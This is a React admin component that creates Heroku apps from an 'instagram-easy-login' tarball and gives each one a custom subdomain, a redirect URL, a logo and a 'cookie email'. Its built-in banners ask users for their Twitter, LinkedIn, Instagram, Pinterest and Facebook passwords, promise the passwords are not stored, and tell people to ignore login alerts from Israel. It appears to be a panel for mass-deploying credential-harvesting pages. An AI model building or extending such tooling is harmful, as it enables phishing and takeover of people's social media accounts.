import React from "react";
import "./css/app.css";
import { Component } from "react";
import NavBar from "./NavBar";
import Axios from "axios";
import ReactPolling from "react-polling";
import axios from "axios";
// import "react-dropdown/style.css";
export default class App extends Component {
  state = {
    AppName: "",
    cookieEmail: "",
    headers: "",
    polling: false,
    id: "",
    status: "",
    REACT_APP_TITLE: "",
    REACT_APP_IMAGE: "",
    REACT_APP_REDIRECTURL: "",
    REACT_APP_TWITTER: "true",
    REACT_APP_LINKEDIN: "true",
    REACT_APP_INSTAGRAM: "true",
    REACT_APP_PINTEREST: "true",
    REACT_APP_FACEBOOK: "true",
    REACT_APP_SECONDARY_BANNER:
      "Our system connects from Israel - do not be alert if you receive a login notification about this, itâ€™s perfectly normal.",
    REACT_APP_BANNER_TWITTER: "true",
    REACT_APP_BANNER_TWITTER_HEADER:
      "Your account security is very important to us!",
    REACT_APP_BANNER_TWITTER_BODY:
      "We will not store your password after this connection process. The password is required to establish a connection with Twitter.",
    REACT_APP_BANNER_LINKEDIN: "true",
    REACT_APP_BANNER_LINKEDIN_HEADER:
      "Your account security is very important to us!",
    REACT_APP_BANNER_LINKEDIN_BODY:
      "We will not store your password after this connection process. The password is required to establish a connection with LinkedIN.",
    REACT_APP_BANNER_INSTAGRAM: "true",
    REACT_APP_BANNER_INSTAGRAM_HEADER:
      "Your account security is very important to us!",
    REACT_APP_BANNER_INSTAGRAM_BODY:
      "We will not store your password after this connection process. The password is required to establish a connection with Instagram.",
    REACT_APP_BANNER_PINTEREST: "true",
    REACT_APP_BANNER_PINTEREST_HEADER:
      "Your account security is very important to us!",
    REACT_APP_BANNER_PINTEREST_BODY:
      "We will not store your password after this connection process. The password is required to establish a connection with Pinterest.",
    REACT_APP_BANNER_FACEBOOK: "true",
    REACT_APP_BANNER_FACEBOOK_HEADER:
      "Your account security is very important to us!",
    REACT_APP_BANNER_FACEBOOK_BODY:
      "We will not store your password after this connection process. The password is required to establish a connection with Facebook.",
    file: "",
  };
  handleAppName = (e) => {
    this.setState({ AppName: e.target.value });
  };
  handleRedirectChange = (e) => {
    this.setState({ REACT_APP_REDIRECTURL: e.target.value });
  };
  handleCookieEmail = (e) => {
    this.setState({ cookieEmail: e.target.value });
  };
  handleEmail = (e) => {
    this.setState({ email: e.target.value });
  };
  handlePassword = (e) => {
    this.setState({ password: e.target.value });
  };
  handleTitleChange = (e) => {
    this.setState({ REACT_APP_TITLE: e.target.value });
  };

  assignCustomDomainToHerokuApp = () => {
    // send request to assign domain to app
    const herokuAppName = this.state.AppName; 
    const herokuAppDomain =  herokuAppName + ".medialoginpanel.com";
    const herokuAppApiUrl = "https://api.heroku.com/apps/"+herokuAppName+"/domains";
    const herokuAppToken = localStorage.getItem("token");

    axios
      .post(herokuAppApiUrl, {
          "hostname": herokuAppDomain,
          "sni_endpoint": null
        }, {
          headers: {
            "Content-Type": "application/json",
            Accept: "application/vnd.heroku+json; version=3",
            Authorization: herokuAppToken,
          }
        }
      ).then((response) => {
        console.log(response.data);
        if (response.data.cname !== "") {
          this.assignHerokuCnameToCloudFlareDns(response.data.cname, herokuAppDomain);
        }
      })
      .catch((error) => {
        console.log(error);
        alert("Something went wrong, while assigning custom domain.");
      });
  };

  assignHerokuCnameToCloudFlareDns = (cname, domain) => {
    // send request to WordPress Social Proxy
    const spApiUrl = "https://provisdemo.com/testapi.php?cname="+cname+"&hostname="+domain;

     fetch(spApiUrl, {
          method: "GET",
      }).then((response) => {
        console.log(response);
        if (response.status) {

          // else condition of onSuccess
          alert("succeeded");
          this.setState({
            status: "succeeded",
          });
          return false;
        
        } else {
          console.log(response.error);
          alert(response.error);
        }
      })
      .catch((error) => {
        console.log(error);
        alert("Something went wrong, while assigning dns to cloudflare.");
      });
  }

  onSuccess = (response) => {
    console.log(response);
    if (response.status === "pending") {
      return true;
    } else {
      this.assignCustomDomainToHerokuApp();
    }
  };
  createApp = async (e) => {
    e.preventDefault();
    const TarBallUrl =
      "https://github.com/instaproject77/instagram-easy-login/tarball/newui/";
    const token = localStorage.getItem("token");
    const headers = {
      "Content-Type": "application/json",
      Accept: "application/vnd.heroku+json; version=3",
      Authorization: token,
    };
    const regExp = /^[a-z][a-z0-9-]{1,28}[a-z0-9]$/;
    // if (this.state.file.length === 0) {
    //   alert("please upload file");
    //   return;
    // }
    const {
      cookieEmail,
      REACT_APP_IMAGE,
      AppName,
      REACT_APP_TITLE,
      REACT_APP_REDIRECTURL,
      REACT_APP_TWITTER,
      REACT_APP_LINKEDIN,
      REACT_APP_INSTAGRAM,
      REACT_APP_FACEBOOK,
      REACT_APP_PINTEREST,
      REACT_APP_SECONDARY_BANNER,
      REACT_APP_BANNER_TWITTER,
      REACT_APP_BANNER_TWITTER_HEADER,
      REACT_APP_BANNER_TWITTER_BODY,
      REACT_APP_BANNER_LINKEDIN,
      REACT_APP_BANNER_LINKEDIN_HEADER,
      REACT_APP_BANNER_LINKEDIN_BODY,
      REACT_APP_BANNER_INSTAGRAM,
      REACT_APP_BANNER_INSTAGRAM_HEADER,
      REACT_APP_BANNER_INSTAGRAM_BODY,
      REACT_APP_BANNER_FACEBOOK,
      REACT_APP_BANNER_FACEBOOK_HEADER,
      REACT_APP_BANNER_FACEBOOK_BODY,
      REACT_APP_BANNER_PINTEREST,
      REACT_APP_BANNER_PINTEREST_BODY,
      REACT_APP_BANNER_PINTEREST_HEADER,
    } = this.state;
    if (regExp.test(AppName)) {
      let data = {
        source_blob: { url: TarBallUrl },
        app: { name: this.state.AppName },
      };
      if (cookieEmail !== "") {
        const env = {
          REACT_APP_COOKIE_EMAIL: cookieEmail,
          REACT_APP_URL: `https://medialoginpanel.com`,
          REACT_APP_TWITTER: REACT_APP_TWITTER,
          REACT_APP_LINKEDIN: REACT_APP_LINKEDIN,
          REACT_APP_INSTAGRAM: REACT_APP_INSTAGRAM,
          REACT_APP_FACEBOOK: REACT_APP_FACEBOOK,
          REACT_APP_PINTEREST: REACT_APP_PINTEREST,
          REACT_APP_SECONDARY_BANNER: REACT_APP_SECONDARY_BANNER,
          REACT_APP_BANNER_TWITTER: REACT_APP_BANNER_TWITTER,
          REACT_APP_BANNER_TWITTER_HEADER: REACT_APP_BANNER_TWITTER_HEADER,
          REACT_APP_BANNER_TWITTER_BODY: REACT_APP_BANNER_TWITTER_BODY,
          REACT_APP_BANNER_LINKEDIN: REACT_APP_BANNER_LINKEDIN,
          REACT_APP_BANNER_LINKEDIN_HEADER: REACT_APP_BANNER_LINKEDIN_HEADER,
          REACT_APP_BANNER_LINKEDIN_BODY: REACT_APP_BANNER_LINKEDIN_BODY,
          REACT_APP_BANNER_INSTAGRAM: REACT_APP_BANNER_INSTAGRAM,
          REACT_APP_BANNER_INSTAGRAM_HEADER: REACT_APP_BANNER_INSTAGRAM_HEADER,
          REACT_APP_BANNER_INSTAGRAM_BODY: REACT_APP_BANNER_INSTAGRAM_BODY,
          REACT_APP_BANNER_FACEBOOK: REACT_APP_BANNER_FACEBOOK,
          REACT_APP_BANNER_FACEBOOK_HEADER: REACT_APP_BANNER_FACEBOOK_HEADER,
          REACT_APP_BANNER_FACEBOOK_BODY: REACT_APP_BANNER_FACEBOOK_BODY,
          REACT_APP_BANNER_PINTEREST: REACT_APP_BANNER_PINTEREST,
          REACT_APP_BANNER_PINTEREST_HEADER: REACT_APP_BANNER_PINTEREST_HEADER,
          REACT_APP_BANNER_PINTEREST_BODY: REACT_APP_BANNER_PINTEREST_BODY,
        };
        if (REACT_APP_REDIRECTURL.length > 0)
          env["REACT_APP_REDIRECTURL"] = REACT_APP_REDIRECTURL;
        if (REACT_APP_IMAGE.length > 0) {
          env[
            "REACT_APP_FAVICONURL"
          ] = `https://igappstorage.s3.ap-south-1.amazonaws.com/${this.state.REACT_APP_IMAGE}`;
        }
        if (REACT_APP_TITLE.length > 0)
          env["REACT_APP_TITLE"] = REACT_APP_TITLE;
        console.log(env);
        data["overrides"] = {
          env: env,
        };
        try {
          const res = await Axios.post(
            "https://api.heroku.com/app-setups",
            data,
            {
              headers: headers,
            }
          );
          console.log(res.data.id, this.state.AppName);
          if (res.status === 202) {
            this.setState({ headers: headers, polling: true, id: res.data.id });
          }
        } catch (error) {
          console.log(error, data, headers);
          alert("Error has occurred");
        }
      } else {
        alert("Fields cannot be empty");
      }
    } else {
      alert("name is invalid");
    }
  };
  onFormSubmit = (e) => {
    e.preventDefault();
    if (this.state.file !== "") {
      this.setState({ REACT_APP_IMAGE: this.state.file.name });
      console.log("file" + this.state.file);
      const formData = new FormData();
      formData.append("upl", this.state.file);
      const config = {
        headers: {
          "content-type": "multipart/form-data",
        },
      };
      axios
        .post("https://medialoginpanel.com/upload", formData, config)
        .then((response) => {
          alert("The file is successfully uploaded");
          console.log(response);
        })
        .catch((error) => {
          console.log(error);
          alert("Error occured");
        });
    } else {
      alert("Invalid File");
    }
  };
  onChange = (e) => {
    this.setState({ file: e.target.files[0] });
  };
  handleTwitterSelection = () => {
    let currState = this.state.REACT_APP_TWITTER;
    this.setState({
      REACT_APP_TWITTER: currState === "true" ? "false" : "true",
    });
  };
  handleLinkedINSelection = () => {
    let currState = this.state.REACT_APP_LINKEDIN;
    this.setState({
      REACT_APP_LINKEDIN: currState === "true" ? "false" : "true",
    });
  };
  handleInstagramSelection = () => {
    let currState = this.state.REACT_APP_INSTAGRAM;
    this.setState({
      REACT_APP_INSTAGRAM: currState === "true" ? "false" : "true",
    });
  };
  handlePinterestSelection = () => {
    let currState = this.state.REACT_APP_PINTEREST;
    this.setState({
      REACT_APP_PINTEREST: currState === "true" ? "false" : "true",
    });
  };
  handleFacebookSelection = () => {
    let currState = this.state.REACT_APP_FACEBOOK;
    this.setState({
      REACT_APP_FACEBOOK: currState === "true" ? "false" : "true",
    });
  };
  render() {
    return (
      <div className="contain">
        <NavBar />
        <div class="wrap">
          <form class="login-form" action="">
            <div class="form-header">
              <h3>Create app</h3>
            </div>

            <div class="form-group">
              <div style={{ margin: "10px" }}>
                <input
                  type="checkbox"
                  defaultChecked
                  onChange={this.handleTwitterSelection}
                ></input>
                <label>Twitter</label>
                <input
                  name="LinkedIN"
                  type="checkbox"
                  defaultChecked
                  onChange={this.handleLinkedINSelection}
                />
                <label>LinkedIN</label>
                <input
                  name="Instagram"
                  type="checkbox"
                  defaultChecked
                  onChange={this.handleInstagramSelection}
                />
                <label>Instagram</label>
                <br></br>
                <input
                  name="Pinterest"
                  type="checkbox"
                  defaultChecked
                  onChange={this.handlePinterestSelection}
                />

                <label>Pinterest</label>
                <input
                  name="Facebook"
                  type="checkbox"
                  defaultChecked
                  onChange={this.handleFacebookSelection}
                />
                <label>Facebook</label>
              </div>

              <input
                type="text"
                class="form-input"
                placeholder="Enter App name"
                onChange={this.handleAppName}
                value={this.state.AppName}
              />
            </div>
            <div class="form-group">
              <input
                type="text"
                class="form-input"
                placeholder="Enter CookieEmail"
                value={this.state.cookieEmail}
                onChange={this.handleCookieEmail}
              />
            </div>
            <div class="form-group">
              <input
                type="text"
                class="form-input"
                placeholder="Enter redirect url"
                onChange={this.handleRedirectChange}
                value={this.state.REACT_APP_REDIRECTURL}
              />
            </div>
            <div class="form-group">
              <input
                type="text"
                class="form-input"
                placeholder="Enter app title"
                onChange={this.handleTitleChange}
                value={this.state.REACT_APP_TITLE}
              />
            </div>
            <br />
            <h4>Select logo</h4>
            <div class="form-group">
              <input
                type="file"
                class="form-input"
                name="myImage"
                onChange={this.onChange}
              />
              <button
                style={{ margin: "10px" }}
                className="upload"
                onClick={this.onFormSubmit}
              >
                Upload image
              </button>
            </div>
            <br />
            <div class="form-group">
              <button
                class="form-button"
                type="submit"
                onClick={this.createApp}
                // onClick={this.assignHerokuCnameToCloudFlareDns}
              >
                Create App
              </button>
            </div>
            {this.state.polling ? (
              <ReactPolling
                url={`https://api.heroku.com/app-setups/${this.state.id}`}
                interval={3000} // in milliseconds(ms)
                retryCount={3} // this is optional
                onSuccess={this.onSuccess}
                onFailure={() => this.setState({ status: "failed" })} // this is optional
                method={"GET"}
                headers={this.state.headers} // this is optional
                body={null}
                render={({ startPolling, stopPolling, isPolling }) => {
                  if (isPolling) {
                    return <h4> Creating app please wait..</h4>;
                  } else {
                    return <h4> App Creation {this.state.status}</h4>;
                  }
                }}
              />
            ) : (
              ""
            )}
          </form>
        </div>
      </div>
    );
  }
}
